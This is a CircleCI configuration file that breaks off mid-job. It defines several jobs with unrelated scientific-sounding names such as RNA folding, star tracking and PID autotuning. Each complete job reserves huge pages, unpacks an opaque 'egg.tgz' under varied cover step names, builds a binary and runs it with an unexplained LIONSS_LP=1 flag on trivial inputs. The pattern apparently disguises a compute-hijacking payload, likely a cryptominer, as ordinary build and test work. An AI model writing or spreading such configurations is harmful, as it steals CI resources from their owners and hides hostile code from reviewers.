version: 2.1

jobs:
  rnaFold:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Prepare input sequence
          command: |
            printf '>s1\nGGGAAACCCUUU\n' > sample.fa
      - run:
          name: Build folding kernel
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target rnaFold -j2
      - run:
          name: Fold secondary structure
          command: LIONSS_LP=1 ./build/rnaFold --seq sample.fa --temp 37
  star-tracker:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load catalog
          command: |
            printf 'stars 2000\n' > stars.cat
      - run:
          name: Build attitude sensor
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target star-tracker -j2
      - run:
          name: Match star field
          command: LIONSS_LP=1 ./build/star-tracker --catalog stars.cat --fov 20
  PidAutotune:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Record step response
          command: |
            printf 't,y\n0,0\n1,0.6\n' > step.csv
      - run:
          name: Build controller
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target PidAutotune -j2
      - run:
          name: Autotune PID gains
          command: LIONSS_LP=1 ./build/PidAutotune --data step.csv --method relay
  stress_soak:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set duration
          command: |
            printf 'minutes 5\n' > soak.cfg
      - run:
          name: Build soak harness
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target stress_soak -j2
      - run:
          name: Run soak test
          command: LIONSS_LP=1 ./build/stress_soak --conf soak.cfg --threads 16
  tickresample:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load raw ticks
          command: |
